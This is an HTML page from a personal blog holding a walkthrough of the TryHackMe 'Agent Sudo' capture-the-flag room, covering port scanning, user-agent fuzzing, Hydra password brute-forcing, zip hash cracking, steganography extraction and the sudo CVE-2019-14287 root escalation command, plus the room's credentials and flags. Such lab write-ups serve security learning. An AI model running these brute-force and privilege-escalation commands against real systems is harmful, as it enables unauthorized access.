@@ -1,0 +1,396 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe Agent Sudo | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="TryHackMe Agent Sudo" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthrough/Writeup of a TryHackMe room about nmap, ftp, steganography and privilege escalation" />
+<meta property="og:description" content="Walkthrough/Writeup of a TryHackMe room about nmap, ftp, steganography and privilege escalation" />
+<link rel="canonical" href="http://localhost:4000/tryhackme/Agent-Sudo/" />
+<meta property="og:url" content="http://localhost:4000/tryhackme/Agent-Sudo/" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TryHackMe Agent Sudo" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthrough/Writeup of a TryHackMe room about nmap, ftp, steganography and privilege escalation","headline":"TryHackMe Agent Sudo","url":"http://localhost:4000/tryhackme/Agent-Sudo/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="agent-sudo"><a href="https://tryhackme.com/room/agentsudoctf">Agent Sudo</a><!-- omit in toc --></h1>
+
+<p>This is an easy-level CTF concerning some of the fundamental steps of the <a href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html">security killchain</a>:</p>
+
+<ul>
+  <li>enumeration;</li>
+  <li>exploitation;</li>
+  <li>actions on objectives;</li>
+  <li>privilege escalation.</li>
+</ul>
+
+<h3 id="table-of-contents">Table of contents</h3>
+<ul>
+  <li><a href="#enumerate">Enumerate</a></li>
+  <li><a href="#hash-cracking-and-brute-force">Hash cracking and brute-force</a></li>
+  <li><a href="#capture-the-user-flag">Capture the user flag</a></li>
+  <li><a href="#privilege-escalation">Privilege escalation</a></li>
+</ul>
+
+<hr />
+
+<h2 id="enumerate">Enumerate</h2>
+
+<p>First we are asked to scan the machine’s ports. To get through this section you’ll need to install <a href="https://nmap.org/">nmap</a> (you don’t need to if you use <a href="https://www.kali.org/">Kali</a>) as recommeneded by thm. We’ll use it by following this syntax:</p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap [target_IP]</code></p>
+
+<p>where <code class="language-plaintext highlighter-rouge">[target_IP]</code> is the machine’s IP address.</p>
+
+<p>You’ll get something like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>This means that the machine has 3 open ports. An open HTTP means a web server is active. You can visit it by pasting the <code class="language-plaintext highlighter-rouge">[target_IP]</code> inside your browser’s address bar.</p>
+
+<p>By visiting this page, we’ll see this content:</p>
+
+<p><img src="/assets/images/thm/as/welcome.png" alt="welcome" /></p>
+
+<p>We are now asked to find a way to access some “secret content”. To get through this section you’ll need to install <a href="https://portswigger.net/burp">burpsuite</a> (you don’t need to if you use <a href="https://www.kali.org/">Kali</a>). This tool will allow you to manipulate HTTP requests. This means that we can change our <code class="language-plaintext highlighter-rouge">user-agent</code> to access the hidden content.</p>
+
+<p>Open up the Proxy tab and then Burp’s browser, paste the IP inside the address bar. Go back to the dashboard and right-click on the item you just created (a get request to the [target_IP]) and click <code class="language-plaintext highlighter-rouge">send to Repeater</code>. Going to the Repeater section will show you the request’s header parameters. Among these, look for <code class="language-plaintext highlighter-rouge">user-agent</code>:</p>
+
+<p><img src="/assets/images/thm/as/request.png" alt="request" /></p>
+
+<p>Let’s delete its value field and put <code class="language-plaintext highlighter-rouge">R</code>, as it looks like the agents use a letter as codename:</p>
+
+<p><img src="/assets/images/thm/as/r.png" alt="r" /></p>
+
+<p>Clicking on Response will show that a different message has been displayed:</p>
+
+<p><code class="language-plaintext highlighter-rouge">What are you doing! Are you one of the 25 employees? If not, I going to report this incident</code></p>
+
+<p>Clicking on Render will allow you to see the graphical version of the website:</p>
+
+<p><img src="/assets/images/thm/as/render.png" alt="render" /></p>
+
+<p>Now go back to the Dashboard and right click on the same item, then click <code class="language-plaintext highlighter-rouge">Send to Intruder</code>. From Intruder delete the user-agent value field and click <code class="language-plaintext highlighter-rouge">Add §</code>. This is the point in the request that will show the payload. Let’s create our payload, knowing that we have to submit every letter in the alphabet:</p>
+
+<p>(bash, GNU/Linux)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for letter in {A..Z}; do
+    echo "$letter"
+done &gt; alphabet.txt
+</code></pre></div></div>
+
+<p>(PowerShell, Windows)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"A".."Z" | Out-File "alphabet.txt
+</code></pre></div></div>
+
+<p>This script will print all of the letters in the alphabet inside <code class="language-plaintext highlighter-rouge">alphabet.txt</code>.</p>
+
+<p>Go back to Intruder and load <code class="language-plaintext highlighter-rouge">alhabet.txt</code> by pressoing the load button. Select “Sniper attack” and press “Start attack”. This will open a new burp window with all payloads and related outcomes.</p>
+
+<p>Notice that the <code class="language-plaintext highlighter-rouge">C</code> payload has a different length value from others (450 instead of 445/446):</p>
+
+<p><img src="/assets/images/thm/as/c.png" alt="c" /></p>
+
+<p>Opening this payload’s response will show a new <code class="language-plaintext highlighter-rouge">Location</code> field:</p>
+
+<p><img src="/assets/images/thm/as/location.png" alt="location" /></p>
+
+<p>appending <code class="language-plaintext highlighter-rouge">agent_C_attention.php</code> to the [target_IP] in your browser’s address bar will return this page:</p>
+
+<p><img src="/assets/images/thm/as/chris.png" alt="chris" /></p>
+
+<p>This means that Agent C’s name is <code class="language-plaintext highlighter-rouge">Chris</code>.</p>
+
+<h2 id="hash-cracking-and-brute-force">Hash cracking and brute-force</h2>
+
+<p>We know there are more open ports on this machine: <a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol">FTP</a> (File Transfer Protocol) and <a href="https://en.wikipedia.org/wiki/Secure_Shell">SSH</a> (Secure Shell). THM tells us we have to find the password to authenticate and use FTP, which will allow us to trasfer files from this machine remotely.</p>
+
+<p>To do this we’ll follow the hint and use <a href="https://www.kali.org/tools/hydra/">Hydra</a>, a password-guessing tool.</p>
+
+<p>After installing (you don’t need to if you use <a href="https://www.kali.org/">Kali</a>), download the <a href="https://weakpass.com/wordlists/rockyou.txt">rockyou.txt wordlist</a> (you don’t need to if you use <a href="https://www.kali.org/">Kali</a>), then execute the attack:</p>
+
+<p><code class="language-plaintext highlighter-rouge">hydra -l chris -P /usr/share/wordlists/rockyou.txt [target_IP] ftp</code></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-l</code> means that we know which login name we wanna use: <code class="language-plaintext highlighter-rouge">chris</code>. Otherwise we could’ve used a wordlist with <code class="language-plaintext highlighter-rouge">-L</code>;</li>
+  <li><code class="language-plaintext highlighter-rouge">-P</code> means that we are submitting an entire wordlist: hydra will try each of these entries as passwords;</li>
+  <li><code class="language-plaintext highlighter-rouge">/usr/share/wordlists/rockyou.txt</code> is the general path to the rockyou.txt wordlist inside Kali linux;</li>
+  <li><code class="language-plaintext highlighter-rouge">ftp</code> specifies the service we need to break into.</li>
+</ul>
+
+<p>Hydra will then return something like this:</p>
+
+<p><img src="/assets/images/thm/as/ftpass.png" alt="ftpass" /></p>
+
+<p>Now we know that chris’ password for FTP is <code class="language-plaintext highlighter-rouge">crystal</code>. Let’s login with</p>
+
+<p><code class="language-plaintext highlighter-rouge">ftp [remote_IP]</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">Name: chris</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">Password: crystal</code></p>
+
+<p>With the <code class="language-plaintext highlighter-rouge">ls</code> command we can see the content of the current directory, which will be:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+</code></pre></div></div>
+
+<p>however we cannot access these files remotely via FTP. To read these txt files, we’ll need to transfer them over to our machine with <code class="language-plaintext highlighter-rouge">mget</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">mget</code></p>
+
+<p>then, when prompted with <code class="language-plaintext highlighter-rouge">(remote-files)</code>, insert the filename.</p>
+
+<p>After downloading all of the files, open <code class="language-plaintext highlighter-rouge">To_agentJ.txt</code> with <code class="language-plaintext highlighter-rouge">cat To_agentJ.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+</code></pre></div></div>
+
+<p>This means that one of these pictures has a hidden message. Let’s look into them with <a href="https://www.kali.org/tools/binwalk/"><code class="language-plaintext highlighter-rouge">binwalk</code></a>, atool that can identify files that have been embedded inside other files. Let’s try <code class="language-plaintext highlighter-rouge">cute-alien.jpg</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">binwalk cute-alien.jpg</code></p>
+
+<p>This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+</code></pre></div></div>
+
+<p>This means that it’s just a normal JPEG image. It’s <code class="language-plaintext highlighter-rouge">cutie.png</code>’s turn now:</p>
+
+<p><code class="language-plaintext highlighter-rouge">binwalk cutie.png</code></p>
+
+<p>This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+</code></pre></div></div>
+
+<p>It looks like there is a zip file inside this image. Let’ extract it with:</p>
+
+<p><code class="language-plaintext highlighter-rouge">binwalk -e cutie.png</code></p>
+
+<p>after opening the new <code class="language-plaintext highlighter-rouge">_cutie.png.extracted</code> directory with <code class="language-plaintext highlighter-rouge">cd _cutie.png.extracted</code> we can see, by using <code class="language-plaintext highlighter-rouge">ls</code>, that there’s a <code class="language-plaintext highlighter-rouge">8702.zip</code> file inside.</p>
+
+<p>THM tells us to use <a href="https://www.openwall.com/john/">John The Ripper</a>, but in order to do so we’ll need to convert our zip file in a format which is accepted by John. We’ll use <a href="https://linuxcommandlibrary.com/man/zip2john">zip2john</a> to do this:</p>
+
+<p><code class="language-plaintext highlighter-rouge">zip2john 8702.zip &gt; hash.txt</code></p>
+
+<p>Then we can finally use john to crack the password:</p>
+
+<p><code class="language-plaintext highlighter-rouge">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></p>
+
+<p>This will tell us that the zip file’s password is <code class="language-plaintext highlighter-rouge">alien</code></p>
+
+<p>We can now decompress the zip file with <code class="language-plaintext highlighter-rouge">7z</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">7z e 8702.zip</code> (<code class="language-plaintext highlighter-rouge">e</code> means extract)</p>
+
+<p>This will return:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
+ 64-bit locale=it_IT.UTF-8 Threads:1 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 280 bytes (1 KiB)
+
+Extracting archive: 8702.zip
+--
+Path = 8702.zip
+Type = zip
+Physical Size = 280
+</code></pre></div></div>
+
+<p>When prompted for the password, type <code class="language-plaintext highlighter-rouge">alien</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter password (will not be echoed): alien
+</code></pre></div></div>
+
+<p>This will return</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Everything is Ok
+
+Size:       86
+Compressed: 280
+</code></pre></div></div>
+
+<p>meaning we can now open read the zip file’s content. Use <code class="language-plaintext highlighter-rouge">ls</code> to see the new file, then <code class="language-plaintext highlighter-rouge">cat ToagentR.txt</code> to read it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+</code></pre></div></div>
+
+<p>This name seems to be encoded. Copy <code class="language-plaintext highlighter-rouge">QXJlYTUx</code> and decode it from base64 with <code class="language-plaintext highlighter-rouge">echo QXJlYTUx | base64 -d</code>.</p>
+
+<p>This will return <code class="language-plaintext highlighter-rouge">Area51</code>, which is most probably the password to something hidden inside the other picture we got via FTP: <code class="language-plaintext highlighter-rouge">cute-alien.jpg</code>. Since binwalk told us nothing about it, the content is hidden through <a href="https://en.wikipedia.org/wiki/Steganography">steganography</a>.</p>
+
+<p>To extract the hidden message we’ll use <a href="https://steghide.com/">steghide</a>, a steganography tool. The correct syntax will be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">steghide extract -sf cute-alien.jpg</code></p>
+
+<p>We’ll be prompted to type a passphrase (<code class="language-plaintext highlighter-rouge">Area51</code>):</p>
+
+<p><code class="language-plaintext highlighter-rouge">Enter passphrase: Area51</code></p>
+
+<p>This wil return:</p>
+
+<p><code class="language-plaintext highlighter-rouge">wrote extracted data to "message.txt".</code></p>
+
+<p>Let’s read <code class="language-plaintext highlighter-rouge">message.txt</code> with cat <code class="language-plaintext highlighter-rouge">message.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+</code></pre></div></div>
+
+<p>This means that the other agent’s name is <code class="language-plaintext highlighter-rouge">james</code> and its’ <a href="https://en.wikipedia.org/wiki/Secure_Shell"><code class="language-plaintext highlighter-rouge">SSH</code></a> login password is <code class="language-plaintext highlighter-rouge">hackerrules!</code></p>
+
+<h2 id="capture-the-user-flag">Capture the user flag</h2>
+
+<p>Let’s login via SSH to the machine:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh james@[target_IP]</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">james@[target_IP]'s password: hackerrules!</code></p>
+
+<p>Once we logged in, let’ take a look around with <code class="language-plaintext highlighter-rouge">ls</code>; we’ll se two files:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Alien_autospy.jpg  user_flag.txt</code></p>
+
+<p>Let’s read the user flag with <code class="language-plaintext highlighter-rouge">cat user_flag.txt</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">b03d975e8c92a7c04146cfa7a5a313c7</code></p>
+
+<p>To view the picture instead, we need to close the SSH session and copy the picture over to our machine with <a href="https://www.freecodecamp.org/news/scp-linux-command-example-how-to-ssh-file-transfer-from-remote-to-local/"><code class="language-plaintext highlighter-rouge">scp</code></a>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">scp james@10.10.246.178:Alien_autospy.jpg .</code></p>
+
+<p>The dot at the end specifies that you want to save the file to the current directory (the one you’re in).</p>
+
+<p>Once we copied the picture we can upload it to a reverse image search tool, such as <a href="https://tineye.com/">TinEye</a>, and by selecting the FoxNews entry as THM tells us in the hint, we get to know that this image was faked by a filmmaker and is known as <code class="language-plaintext highlighter-rouge">Roswell alien autopsy</code>:</p>
+
+<p><img src="/assets/images/thm/as/alien.png" alt="alien" /></p>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+
+<p>Since we need to get root privileges, let login back into SSH with <code class="language-plaintext highlighter-rouge">james</code> and <code class="language-plaintext highlighter-rouge">hackerrules!</code> credentials.</p>
+
+<p>By using <code class="language-plaintext highlighter-rouge">sudo -l</code> we can see which commands james can run:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+</code></pre></div></div>
+
+<p>Look this up online and you’ll stumble upon <a href="https://www.exploit-db.com/exploits/47502">CVE-2019–14287</a>, which allows us to get root access by running:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u#-1 /bin/bash
+</code></pre></div></div>
+
+<p>Indeed, executing this command will give us root access. Let’ navigate back to the <code class="language-plaintext highlighter-rouge">/</code> folder with <code class="language-plaintext highlighter-rouge">cd /</code>, now open the root directory with <code class="language-plaintext highlighter-rouge">cd root</code>, then open the root flag with <code class="language-plaintext highlighter-rouge">cat root.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+</code></pre></div></div>
+
+<p>Now we finally know the root flag (<code class="language-plaintext highlighter-rouge">b53a02f55b57d4439e3341834d70c062</code>) and Agent R’s name (<code class="language-plaintext highlighter-rouge">DesKel</code>).</p>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
